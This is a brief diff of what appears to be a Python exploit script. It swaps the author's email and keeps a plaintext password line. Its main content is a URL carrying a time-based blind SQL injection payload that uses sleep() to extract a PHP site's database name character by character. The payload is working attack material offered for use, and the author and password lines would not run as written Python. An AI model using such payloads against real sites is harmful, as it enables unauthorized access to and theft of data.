@@ -1,6 +1,6 @@
 import requests
 
-author:13776049410@139.com
+author:13962606066@139.com
 pwd:admintest@admintest
 
 url = "http://www.test.cc/xs.php?id=41 and If(ascii(substr(database(),%d,1))=%d,sleep(3),1)"
